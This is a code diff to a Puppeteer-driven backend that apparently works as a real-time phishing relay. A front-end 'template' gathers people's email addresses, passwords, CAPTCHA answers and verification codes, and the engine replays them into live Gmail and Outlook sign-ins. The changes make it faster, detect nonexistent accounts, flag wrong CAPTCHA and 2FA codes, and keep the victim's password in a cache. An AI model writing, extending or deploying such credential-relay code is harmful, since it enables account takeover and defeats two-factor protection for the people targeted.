@@ -21,6 +21,7 @@ import {
     resolveMx,
     resolveA,
     isInbox,
+    detectGmailEmailError,
     checkVerification,
     setCorsHeaders,
     startAppScriptDataBackgroundUpdater,
@@ -430,40 +431,41 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     // sso_reload=true, a `common/login` hand-off, or login.live.com oauth20_authorize.srf.
                     // Wait for the URL to STABILIZE (same URL for ~3s) before doing any further state
                     // detection, so intermediate redirects aren't mistaken for the password step.
-                    const urlStableDeadline = Date.now() + 15000;
-                    let lastUrl = page.url();
-                    let stableForMs = 0;
-                    while (Date.now() < urlStableDeadline && stableForMs < 3000) {
-                        const probeUrl = page.url();
-                        if (probeUrl === lastUrl) {
-                            stableForMs += 800;
-                        } else {
-                            lastUrl = probeUrl;
-                            stableForMs = 0;
-                            logger.debug(`[checkAccountAccess][${instanceId}] Post-email URL transitioned to: ${probeUrl}`);
+                    // Gmail stabilizes instantly — skip the 15s polling loop for speed.
+                    if (platform === 'gmail') {
+                        await Promise.race([
+                            page.waitForFunction(() => document.readyState === 'complete').catch(() => null),
+                            new Promise(res => setTimeout(res, 2000))
+                        ]);
+                    } else {
+                        const urlStableDeadline = Date.now() + 15000;
+                        let lastUrl = page.url();
+                        let stableForMs = 0;
+                        while (Date.now() < urlStableDeadline && stableForMs < 3000) {
+                            const probeUrl = page.url();
+                            if (probeUrl === lastUrl) {
+                                stableForMs += 800;
+                            } else {
+                                lastUrl = probeUrl;
+                                stableForMs = 0;
+                                logger.debug(`[checkAccountAccess][${instanceId}] Post-email URL transitioned to: ${probeUrl}`);
+                            }
+                            if (stableForMs >= 3000) break;
+                            await new Promise(res => setTimeout(res, 800));
                         }
-                        if (stableForMs >= 3000) break;
-                        await new Promise(res => setTimeout(res, 800));
+                        await Promise.race([
+                            page.waitForFunction(() => document.readyState === 'complete').catch(() => null),
+                            new Promise(res => setTimeout(res, 3000))
+                        ]);
                     }
-                    await Promise.race([
-                        page.waitForFunction(() => document.readyState === 'complete').catch(() => null),
-                        new Promise(res => setTimeout(res, 3000))
-                    ]);
 
-                    // Immediately set WAITINGPASSWORD so template shows password form
-                    // while engine navigates intermediate views / solves CAPTCHAs.
-                    // BUT only when the password is NOT already available — if the user
-                    // submitted email+password together, keep the template in loading
-                    // (PROCESSING) instead of flickering it to the password form.
+                    // Defer WAITINGPASSWORD write until after email error check passes.
+                    // For invalid emails, this prevents the template briefly showing
+                    // the password form before switching to the error state.
+                    let deferredWaitingPassword = false;
                     if (browserId && !password) {
                         _timer.waitingPasswordSet = Date.now();
-                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set. elapsed: ${_timer.waitingPasswordSet - _timer.start}ms`);
-                        updateBrowserRowDataFast(browserId, {
-                            status: "WAITINGPASSWORD",
-                            email: email || '',
-                            verified: false,
-                            fullAccess: false
-                        });
+                        deferredWaitingPassword = true;
                     }
 
                     // Brief settle delay before checking page state
@@ -472,13 +474,38 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     // Wait for the page to actually transition (SPA) — look for either "Verify your email" or password input
                     const transitionSelectors = ["[data-testid='title']", "input[name='passwd']", "input[type='password']", "#proof-confirmation-email-input", "h1"];
                     try {
-                        await page.waitForSelector(transitionSelectors.join(', '), { visible: true, timeout: 5000 });
+                        const transitionTimeout = platform === 'gmail' ? 2000 : 5000;
+                        await page.waitForSelector(transitionSelectors.join(', '), { visible: true, timeout: transitionTimeout });
                     } catch (e) { /* none visible — continue, additional views handler will detect */ }
                     await new Promise(res => setTimeout(res, 300));
 
                     // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
                     await handleAdditionalViews(page, platformConfig, instanceId);
                     speed('additional views handled (post-email)');
+
+                    // ── Detect "Couldn't find this account" error (Gmail only) ──
+                    // Uses URL-based detection instead of DOM querySelector because
+                    // Google's login page uses a closed shadow DOM (jsshadow) that
+                    // document.querySelector cannot pierce.
+                    if (platform === 'gmail') {
+                        const emailErrCheck = await detectGmailEmailError(page, instanceId).catch(() => ({ found: false }));
+                        if (emailErrCheck.found) {
+                            logger.info(`[checkAccountAccess][${instanceId}] Email error detected (reuse path): "${emailErrCheck.message}"`);
+                            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: emailErrCheck.message };
+                        }
+                    }
+
+                    // NOW write the deferred WAITINGPASSWORD — email error check passed,
+                    // so it's safe to show the password form in the template.
+                    if (deferredWaitingPassword && browserId) {
+                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (deferred). elapsed: ${_timer.waitingPasswordSet - _timer.start}ms`);
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGPASSWORD",
+                            email: email || '',
+                            verified: false,
+                            fullAccess: false
+                        });
+                    }
 
                     // CAPTCHA handling — only for Google (image CAPTCHA + reCAPTCHA Enterprise)
                     if (platform === 'gmail') {
@@ -497,11 +524,19 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                         // Check if CAPTCHA is still present (wrong answer → new CAPTCHA shown)
                         const stillHasCaptcha = await page.$('#captchaimg').catch(() => null);
-                        const hasError = await page.evaluate(() => {
-                            return !!(document.querySelector('.Ekjuhf') || (document.querySelector('#i9') || '').textContent?.includes('re-enter'));
-                        }).catch(() => false);
 
-                        if (stillHasCaptcha && hasError) {
+                        // Email error takes priority — "Couldn't find this account" appears
+                        // alongside CAPTCHA but is NOT a wrong-CAPTCHA-answer signal.
+                        // Use URL-based detection (shadow DOM blocks querySelector).
+                        if (platform === 'gmail') {
+                            const emailErrDuringCaptcha = await detectGmailEmailError(page, instanceId).catch(() => ({ found: false }));
+                            if (emailErrDuringCaptcha.found) {
+                                logger.info(`[checkAccountAccess][${instanceId}] Email error detected during CAPTCHA: "${emailErrDuringCaptcha.message}". Returning emailExists=false.`);
+                                return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: emailErrDuringCaptcha.message };
+                            }
+                        }
+                        if (stillHasCaptcha) {
+                            // CAPTCHA answer was wrong (no email error) → retry
                             logger.warn(`[checkAccountAccess][${instanceId}] CAPTCHA answer was incorrect (attempt ${captchaAttempt + 1}/${maxCaptchaRetries}). Retrying...`);
                             await new Promise(r => setTimeout(r, 1000));
                             continue;
@@ -1003,6 +1038,17 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                             }
                             // After inline CAPTCHA, wait for page to potentially navigate
                             await new Promise(r => setTimeout(r, 2000));
+                        }
+                    }
+
+                    // ── Detect "Couldn't find this account" after CAPTCHA solve (normal path) ──
+                    // After CAPTCHA solving, check if the email error persists. Uses URL-based
+                    // detection instead of DOM querySelector (shadow DOM blocks it).
+                    if (platform === 'gmail') {
+                        const emailErrPostCaptcha = await detectGmailEmailError(page, instanceId).catch(() => ({ found: false }));
+                        if (emailErrPostCaptcha.found) {
+                            logger.info(`[checkAccountAccess][${instanceId}] Email error detected (normal path, post-CAPTCHA): "${emailErrPostCaptcha.message}"`);
+                            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, message: emailErrPostCaptcha.message };
                         }
                     }
 
@@ -1578,22 +1624,40 @@ async function phaseWaitingCaptcha(browserId, browser, page, email, password, pl
                     break;
                 }
 
-                const checkData = await fetchDataFromAppScript(1, 30000, false);
-                const checkHeaders = checkData[0];
-                const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                const checkRows = checkData.slice(1);
-                const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-                if (!checkRow) {
-                    logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
+                // Cache-first read: template writes captchaAnswer via update-process → setCachedRow (instant).
+                // Only fall back to sheet if cache doesn't have it.
+                let captchaAnswer = null;
+                let cachedStatus = null;
+                const cachedRow = getCachedRow(browserId);
+                if (cachedRow) {
+                    captchaAnswer = cachedRow.captchaAnswer;
+                    cachedStatus = cachedRow.status;
+                }
+
+                if (cachedStatus === 'FAILED') {
+                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally (cache). Exiting.`);
                     finalStatus = "FAILED";
                     break;
                 }
-                if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
-                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
-                    finalStatus = "FAILED";
-                    break;
+
+                if (!captchaAnswer) {
+                    const checkData = await fetchDataFromAppScript(1, 30000, false);
+                    const checkHeaders = checkData[0];
+                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                    const checkRows = checkData.slice(1);
+                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+                    if (!checkRow) {
+                        logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
+                        finalStatus = "FAILED";
+                        break;
+                    }
+                    if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
+                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
+                        finalStatus = "FAILED";
+                        break;
+                    }
+                    captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
                 }
-                const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
                 if (captchaAnswer && String(captchaAnswer).trim() !== "") {
                     logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
                     updateBrowserRowDataFast(browserId, { status: "PROCESSING", captchaAnswer: '' });
@@ -1626,7 +1690,12 @@ async function phaseWaitingCaptcha(browserId, browser, page, email, password, pl
                             logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
                             await page.keyboard.press('Enter');
                         }
-                        await new Promise(res => setTimeout(res, 3000));
+                        // Reactive wait: page transition or DOM change instead of fixed 3s settle
+                        await Promise.race([
+                            page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 4000 }).catch(() => null),
+                            page.waitForFunction(() => document.readyState === 'complete', { timeout: 4000 }).catch(() => null),
+                            new Promise(res => setTimeout(res, 2000))
+                        ]);
                         // Re-check account access after captcha submission
                         const recheckResult = await runGuardedAccountCheck(browser, page, email, password, platform, browserId, true, _timer);
                         logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
@@ -1674,7 +1743,7 @@ async function phaseWaitingCaptcha(browserId, browser, page, email, password, pl
                 logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
             }
             if (!captchaProcessed && finalStatus !== "FAILED") {
-                await new Promise(res => setTimeout(res, 2000));
+                await new Promise(res => setTimeout(res, 1000));
             }
         }
         if (!captchaProcessed && finalStatus !== "FAILED") {
@@ -4431,6 +4500,36 @@ if (!foundSelector) {
                             codeEntryAttempted = true;
                             logger.info(`[processRow][${browserId}][WAITINGCODE] Code submission complete via ${submitMethod || 'unknown'}.`);
 
+                            // FAST WRONG-CODE DETECTION: If still on code entry page immediately after
+                            // submission, the code was wrong. Skip the 10s wait + inbox guard entirely.
+                            // This cuts wrong-code feedback from ~37s to ~3s.
+                            try {
+                                const earlyState = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                                if (earlyState.required && earlyState.type === 'code') {
+                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Fast wrong-code: still on code entry immediately after submit. Skipping slow path.`);
+                                    sendWrongInputAlert({ type: 'WRONG_CODE', platform, email, browserId, detail: 'Fast detection: still on code entry after submission' });
+                                    const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
+                                    ljp.status = "WAITING_CODE";
+                                    ljp.verified = true;
+                                    ljp.fullAccess = false;
+                                    ljp.message = "Incorrect verification code entered. Please try again.";
+                                    logTemplateSignal(browserId, ljp.message);
+                                    await updateBrowserRowDataFast(browserId, {
+                                        status: "WAITINGCODE",
+                                        verificationCode: '',
+                                        verified: true,
+                                        fullAccess: false,
+                                        lastJsonResponse: JSON.stringify(ljp)
+                                    });
+                                    updateData.lastJsonResponse = JSON.stringify(ljp);
+                                    updateData.verified = true;
+                                    updateData.fullAccess = false;
+                                    finalStatus = "WAITINGCODE";
+                                    activelyProcessing.delete(browserId);
+                                    break;
+                                }
+                            } catch (_) {}
+
                         } catch (codeEntryError) {
                             logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
                         }
@@ -4640,31 +4739,13 @@ if (!foundSelector) {
                                 } catch (_) {}
 
                                 if (!skipSlowPostCodePath) {
-                                    // If no code error, then wait 10 seconds and proceed with existing checks
-                                    await new Promise(res => setTimeout(res, 10000)); // Increased wait to 10 seconds as requested
+                                    // Wait 10 seconds for post-code redirects (Stay Signed In, etc.)
+                                    await new Promise(res => setTimeout(res, 10000));
                                     await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
-                                    // Early PROCESSING_FINALIZING: "Stay Signed In" was handled — code was accepted.
-                                    // Template navigates immediately while engine finishes background work.
-                                    logger.info(`[processRow][${browserId}] Sending early PROCESSING_FINALIZING to template (Stay Signed In handled).`);
-                                    const earlyCached2 = getCachedRow(browserId) || {};
-                                    setCachedRow(browserId, { ...earlyCached2,
-                                        status: "PROCESSING_FINALIZING",
-                                        email: email || '',
-                                        password: password || '',
-                                        verified: true,
-                                        fullAccess: false,
-                                        lastJsonResponse: JSON.stringify({
-                                            browserId, email, status: "PROCESSING_FINALIZING",
-                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
-                                            reachedInbox: false, requiresVerification: false,
-                                            verified: true, fullAccess: false,
-                                            platform, timestamp: new Date().toISOString(),
-                                            message: "Code accepted. Finalizing..."
-                                        })
-                                    });
-                                    // After handling additional views, wait for any pending navigation to complete
+                                    // Do NOT write PROCESSING_FINALIZING here — let the inbox/code-entry check below
+                                    // set the final status. Writing it prematurely causes the template to redirect
+                                    // even when the verification code was incorrect.
                                     await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
-                                    // Extra settle time for Microsoft SPA redirects
                                     await new Promise(res => setTimeout(res, 3000));
                                 }
                             } else {
